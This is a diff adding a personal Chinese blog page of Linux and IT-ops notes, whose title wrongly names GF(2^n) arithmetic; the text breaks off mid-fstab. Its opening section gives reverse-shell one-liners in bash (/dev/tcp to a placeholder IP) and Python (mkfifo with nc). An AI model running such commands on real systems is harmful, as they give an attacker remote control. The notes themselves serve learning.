@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>GF 2^n上算术运算的实现 | H-ZeX | H-ZeX&#39;s Coding Life</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="GF2n">
+    <meta name="description" content="Reverse Shell 受控机器上执行bash -i /dev/tcp/IP/PORT 0&amp;lt;&amp;amp;1 (最后改为0&amp;gt;&amp;amp;1也ok)，入侵者机器提前打开listen socket，可以实现reverse shell eval(&amp;quot;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp">
+<meta name="keywords" content="GF2n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GF 2^n上算术运算的实现">
+<meta property="og:url" content="https://h-zex.github.io/2018/10/18/My-ITOPS-Note/index.html">
+<meta property="og:site_name" content="H-ZeX">
+<meta property="og:description" content="Reverse Shell 受控机器上执行bash -i /dev/tcp/IP/PORT 0&amp;lt;&amp;amp;1 (最后改为0&amp;gt;&amp;amp;1也ok)，入侵者机器提前打开listen socket，可以实现reverse shell eval(&amp;quot;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://h-zex.github.io/2018/10/18/My-ITOPS-Note/LinuxInstall_1.jpg">
+<meta property="og:updated_time" content="2019-02-02T06:17:42.098Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GF 2^n上算术运算的实现">
+<meta name="twitter:description" content="Reverse Shell 受控机器上执行bash -i /dev/tcp/IP/PORT 0&amp;lt;&amp;amp;1 (最后改为0&amp;gt;&amp;amp;1也ok)，入侵者机器提前打开listen socket，可以实现reverse shell eval(&amp;quot;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp">
+<meta name="twitter:image" content="https://h-zex.github.io/2018/10/18/My-ITOPS-Note/LinuxInstall_1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="H-ZeX" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">H-ZeX</h5>
+          <a href="mailto:hzx20112012@gmail.com" title="hzx20112012@gmail.com" class="mail">hzx20112012@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">GF 2^n上算术运算的实现</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">GF 2^n上算术运算的实现</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-10-18T12:06:10.000Z" itemprop="datePublished" class="page-time">
+  2018-10-18
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/数学/">数学</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/数学/密码学/">密码学</a></li></ul></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Reverse-Shell"><span class="post-toc-number">1.</span> <span class="post-toc-text">Reverse Shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SIGINT的SIG-DEF"><span class="post-toc-number">2.</span> <span class="post-toc-text">SIGINT的SIG_DEF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#boot过程"><span class="post-toc-number">3.</span> <span class="post-toc-text">boot过程</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tab补全失效"><span class="post-toc-number">4.</span> <span class="post-toc-text">tab补全失效</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#登录用户管理"><span class="post-toc-number">5.</span> <span class="post-toc-text">登录用户管理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#是否没有listen的socket就无法被入侵？"><span class="post-toc-number">6.</span> <span class="post-toc-text">是否没有listen的socket就无法被入侵？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#wget使用"><span class="post-toc-number">7.</span> <span class="post-toc-text">wget使用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#curl的使用"><span class="post-toc-number">8.</span> <span class="post-toc-text">curl的使用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#axel的使用"><span class="post-toc-number">9.</span> <span class="post-toc-text">axel的使用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#VirtualBox报错“kernel-dirver-not-installed”"><span class="post-toc-number">10.</span> <span class="post-toc-text">VirtualBox报错“kernel dirver not installed”</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#删除内核"><span class="post-toc-number">11.</span> <span class="post-toc-text">删除内核</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#chmod"><span class="post-toc-number">12.</span> <span class="post-toc-text">chmod</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#内核模块加载"><span class="post-toc-number">13.</span> <span class="post-toc-text">内核模块加载</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ufw"><span class="post-toc-number">14.</span> <span class="post-toc-text">ufw</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#安装centos-md"><span class="post-toc-number">15.</span> <span class="post-toc-text">安装centos.md</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#联网"><span class="post-toc-number">15.1.</span> <span class="post-toc-text">联网</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#安装图形界面"><span class="post-toc-number">15.2.</span> <span class="post-toc-text">安装图形界面</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用fstab自动挂载"><span class="post-toc-number">16.</span> <span class="post-toc-text">使用fstab自动挂载</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Deepin"><span class="post-toc-number">16.1.</span> <span class="post-toc-text">Deepin</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Ubuntu"><span class="post-toc-number">16.2.</span> <span class="post-toc-text">Ubuntu</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#mkfs-vfat了sda2那个efi分区结果deepin启动不了"><span class="post-toc-number">17.</span> <span class="post-toc-text">mkfs.vfat了sda2那个efi分区结果deepin启动不了</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编译内核-md"><span class="post-toc-number">18.</span> <span class="post-toc-text">编译内核.md</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#无openssl-bio-h"><span class="post-toc-number">18.1.</span> <span class="post-toc-text">无openssl/bio.h</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#记一次尝试下载-不允许下载的sinacloud的pdf"><span class="post-toc-number">19.</span> <span class="post-toc-text">记一次尝试下载 不允许下载的sinacloud的pdf</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#附录"><span class="post-toc-number">19.1.</span> <span class="post-toc-text">附录</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查找并删除特定文件-md"><span class="post-toc-number">20.</span> <span class="post-toc-text">查找并删除特定文件.md</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#VPS上部署hexo"><span class="post-toc-number">21.</span> <span class="post-toc-text">VPS上部署hexo</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#setenforce-1-设置SELinux-成为enforcing模式"><span class="post-toc-number"></span> <span class="post-toc-text">setenforce 1 设置SELinux 成为enforcing模式</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#搭建ss服务器"><span class="post-toc-number">1.</span> <span class="post-toc-text">搭建ss服务器</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#VLC字幕"><span class="post-toc-number">2.</span> <span class="post-toc-text">VLC字幕</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#vbox的win7虚拟机无法使用usb"><span class="post-toc-number">3.</span> <span class="post-toc-text">vbox的win7虚拟机无法使用usb</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Gnome-configure-md"><span class="post-toc-number">4.</span> <span class="post-toc-text">Gnome-configure.md</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#hide-title-bar"><span class="post-toc-number">5.</span> <span class="post-toc-text">hide title bar</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SSH-md"><span class="post-toc-number">6.</span> <span class="post-toc-text">SSH.md</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#生成秘钥"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">生成秘钥</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#本地配置VPS别名"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">本地配置VPS别名</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Linux安装-md"><span class="post-toc-number">7.</span> <span class="post-toc-text">Linux安装.md</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#硬盘安装deepin"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">硬盘安装deepin</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#刻录U盘安装Fedora或Centos"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">刻录U盘安装Fedora或Centos</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#U盘grub引导多个linux镜像安装"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">U盘grub引导多个linux镜像安装</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#OSC提供的代码make不过"><span class="post-toc-number">8.</span> <span class="post-toc-text">OSC提供的代码make不过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#vim-dos-unix"><span class="post-toc-number">9.</span> <span class="post-toc-text">vim dos unix</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#删除文件名以-开头的文件"><span class="post-toc-number">10.</span> <span class="post-toc-text">删除文件名以-开头的文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件的change，modification时间"><span class="post-toc-number">11.</span> <span class="post-toc-text">文件的change，modification时间</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ctags-注意事项"><span class="post-toc-number">12.</span> <span class="post-toc-text">ctags 注意事项</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#watch命令"><span class="post-toc-number">13.</span> <span class="post-toc-text">watch命令</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#修复light-display-manger失败"><span class="post-toc-number">14.</span> <span class="post-toc-text">修复light display manger失败</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查看glibc版本"><span class="post-toc-number">15.</span> <span class="post-toc-text">查看glibc版本</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#shell使用-时的SIGPIPE"><span class="post-toc-number">16.</span> <span class="post-toc-text">shell使用|时的SIGPIPE</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#安装nvidia驱动"><span class="post-toc-number">17.</span> <span class="post-toc-text">安装nvidia驱动</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Tilix-dont-inherit-the-directory"><span class="post-toc-number">18.</span> <span class="post-toc-text">Tilix dont inherit the directory</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sogouPinyin候选框异常解决方法"><span class="post-toc-number">19.</span> <span class="post-toc-text">sogouPinyin候选框异常解决方法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cache的详细信息（包括相联度，电压等）"><span class="post-toc-number">20.</span> <span class="post-toc-text">cache的详细信息（包括相联度，电压等）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#设置默认浏览器"><span class="post-toc-number">21.</span> <span class="post-toc-text">设置默认浏览器</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#github账户有设置ssh但是仓库push还是要用户密码的解决方法"><span class="post-toc-number">22.</span> <span class="post-toc-text">github账户有设置ssh但是仓库push还是要用户密码的解决方法</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-My-ITOPS-Note"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">GF 2^n上算术运算的实现</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-10-18 20:06:10" datetime="2018-10-18T12:06:10.000Z"  itemprop="datePublished">2018-10-18</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/数学/">数学</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/数学/密码学/">密码学</a></li></ul></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><ul>
+<li>受控机器上执行<code>bash -i /dev/tcp/IP/PORT 0&lt;&amp;1</code> (最后改为<code>0&gt;&amp;1</code>也ok)，入侵者机器提前打开listen socket，可以实现reverse shell</li>
+<li><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)</code>（python代码）也可以</li>
+</ul>
+<h3 id="SIGINT的SIG-DEF"><a href="#SIGINT的SIG-DEF" class="headerlink" title="SIGINT的SIG_DEF"></a>SIGINT的SIG_DEF</h3><ul>
+<li>默认的handler会输出一个换行。</li>
+<li><p>代码</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果不<code>kill -2 a.out</code>则不会输出一个空行，如果kill则会</p>
+</li>
+</ul>
+<h3 id="boot过程"><a href="#boot过程" class="headerlink" title="boot过程"></a>boot过程</h3><ul>
+<li>究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector</li>
+<li>我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要<code>initrd    /boot/initrd.img-4.9.0-deepin13-amd64</code>。（我甚至可以在这条命令前去加载一个ntfs的module）。</li>
+<li>既然boot loader 可以加载<code>/boot/</code>目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢</li>
+<li>关于initrd <blockquote>
+<p>The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.<br>Boot-up operation<br>   When booting up with initrd, the system boots as follows:</p>
+<ol>
+<li>The boot loader loads the kernel program and /dev/initrd’s contents into memory.</li>
+<li>On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used<br>by /dev/initrd.</li>
+<li>The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.</li>
+<li>If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the<br>usual boot sequence.</li>
+<li>If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐<br>cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)</li>
+<li>If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted<br>on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>
+<li>If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does<br>not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐<br>ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when<br>/linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>
+<li>The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h3 id="tab补全失效"><a href="#tab补全失效" class="headerlink" title="tab补全失效"></a>tab补全失效</h3><ul>
+<li>when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够</li>
+<li>this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error</li>
+</ul>
+<h3 id="登录用户管理"><a href="#登录用户管理" class="headerlink" title="登录用户管理"></a>登录用户管理</h3><ul>
+<li><p><code>users</code>或 <code>w</code>查看当前登录的用户</p>
+</li>
+<li><p><code>lsof -iTCP</code> <code>netstat -tunp</code>查看当前的网络连接</p>
+</li>
+<li><p>查看打开的端口</p>
+</li>
+<li><p><code>pkill -kill -t pts/1</code> 踢掉pts/1</p>
+</li>
+<li><p>编辑<code>/etc/hosts.deny</code> ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)</p>
+<p>格式如下（其实不是非常确定以下是有用的）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:218.65.30.43:deny</span><br><span class="line">sshd:58.*.*.*:deny</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="是否没有listen的socket就无法被入侵？"><a href="#是否没有listen的socket就无法被入侵？" class="headerlink" title="是否没有listen的socket就无法被入侵？"></a>是否没有listen的socket就无法被入侵？</h3><h3 id="wget使用"><a href="#wget使用" class="headerlink" title="wget使用"></a>wget使用</h3><ul>
+<li><code>-r</code>递归下载</li>
+<li><code>-k</code>把下载下来的连接修改为本地地址</li>
+<li><code>-e robots=off</code>不respect<code>robots.txt</code></li>
+<li>或者是 set the <code>robots</code> variable to ‘off’ in your .wgetrc. </li>
+<li><code>--user-agent=&quot;&quot;</code>不添加user-agent头，如果不加上这个，有些网站会返回404</li>
+</ul>
+<h3 id="curl的使用"><a href="#curl的使用" class="headerlink" title="curl的使用"></a>curl的使用</h3><ul>
+<li>curl可以模拟post/get等行为，但是似乎没法递归下载</li>
+</ul>
+<h3 id="axel的使用"><a href="#axel的使用" class="headerlink" title="axel的使用"></a>axel的使用</h3><ul>
+<li><code>-n 100</code>开100个线程</li>
+<li>好像还可以调整缓存，从而减少写入磁盘的次数</li>
+</ul>
+<h3 id="VirtualBox报错“kernel-dirver-not-installed”"><a href="#VirtualBox报错“kernel-dirver-not-installed”" class="headerlink" title="VirtualBox报错“kernel dirver not installed”"></a>VirtualBox报错“kernel dirver not installed”</h3><ul>
+<li>复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装<code>virtualbox-dkms</code>，并运行<code>modprobe vboxdrv</code></li>
+<li><p>在4.17内核尝试</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install virtualbox-dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p> 都没有解决问题，更严重的，linux-header-4.17也没有</p>
+</li>
+<li>切换到4.15内核没有解决问题。尝试了以上命令无果</li>
+<li><p>删除4.17内核（直接在<code>/boot/</code>运行<code>rm *4.17* -r</code>）后<code>update-grub</code>。然后重启到<code>4.15.0-23-generic</code>并执行</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install --fix-missing</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms </span><br><span class="line">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure>
+<p> 解决问题</p>
+</li>
+<li>题外话：删除内核时，<code>dpkg --get-selections | grep linux</code> 没有看到4.17相关的</li>
+</ul>
+<h3 id="删除内核"><a href="#删除内核" class="headerlink" title="删除内核"></a>删除内核</h3><ul>
+<li><code>sudo apt-get remove linux-headers-4.4.0-22</code></li>
+<li>在<code>/boot/</code>目录下删除相关的东西</li>
+</ul>
+<h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><ul>
+<li><code>chmod -R 666 test</code>(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）</li>
+<li>给文件夹本身加上x——<code>chmod 777 test</code>就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有<code>x</code>标志</li>
+</ul>
+<h3 id="内核模块加载"><a href="#内核模块加载" class="headerlink" title="内核模块加载"></a>内核模块加载</h3><ul>
+<li><code>modprobe tcp_bbr</code>加载<code>tcp_bbr</code>模块 </li>
+<li>比如，<code>echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf</code>即可实现启动自动加载该模块</li>
+</ul>
+<h3 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h3><ul>
+<li>如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖</li>
+</ul>
+<h3 id="安装centos-md"><a href="#安装centos-md" class="headerlink" title="安装centos.md"></a>安装centos.md</h3><h4 id="联网"><a href="#联网" class="headerlink" title="联网"></a>联网</h4><ul>
+<li><p><a href="http://icyleaf.com/2013/09/network-configuration-in-centos/" target="_blank" rel="noopener">参考资料</a></p>
+</li>
+<li><p>修改<code>/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)</code></p>
+</li>
+<li><p>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEVICE=eth0</span><br><span class="line">HWADDR=&quot;00:22:19:09:4D:3C&quot;</span><br><span class="line">NM_CONTROLLED=yes</span><br><span class="line">ONBOOT=yes      # 默认是 no，我们要改成 yes</span><br><span class="line">BOOTPROTO=dhcp  # 如果不是这个值也要修改</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重启network service</p>
+<ul>
+<li>方法一：<code>service network restart</code></li>
+<li>方法二：<code>/etc/init.d/network restart</code></li>
+</ul>
+</li>
+<li><p>vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat</p>
+</li>
+</ul>
+<h4 id="安装图形界面"><a href="#安装图形界面" class="headerlink" title="安装图形界面"></a>安装图形界面</h4><ul>
+<li><a href="https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7" target="_blank" rel="noopener">安装图形界面</a><ul>
+<li><code>yum groupinstall &quot;X Window System&quot;</code></li>
+<li><code>yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts</code></li>
+<li><code>unlink /etc/systemd/system/default.target</code></li>
+<li><code>ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="使用fstab自动挂载"><a href="#使用fstab自动挂载" class="headerlink" title="使用fstab自动挂载"></a>使用fstab自动挂载</h3><h4 id="Deepin"><a href="#Deepin" class="headerlink" title="Deepin"></a>Deepin</h4><ul>
+<li><p>以下是<code>/etc/fstab</code>的内容</p>
+</li>
+<li><p>在<code>Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux</code>正确工作</p>
+</li>
+<li><p>代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># /dev/sda7</span><br><span class="line">UUID=1faa19b8-abfb-44db-b186-5a368498d42b	/         	ext4      	rw,relatime,data=ordered	0 1</span><br><span class="line"></span><br><span class="line"># /dev/sda1</span><br><span class="line">UUID=CCCB-BF68      	/boot/efi 	vfat      	rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro	0 2</span><br><span class="line"></span><br><span class="line"># /dev/sda4</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3	none      	swap      	defaults  	0 0</span><br><span class="line"></span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5  	    ntfs defaults	0 1</span><br><span class="line">UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># 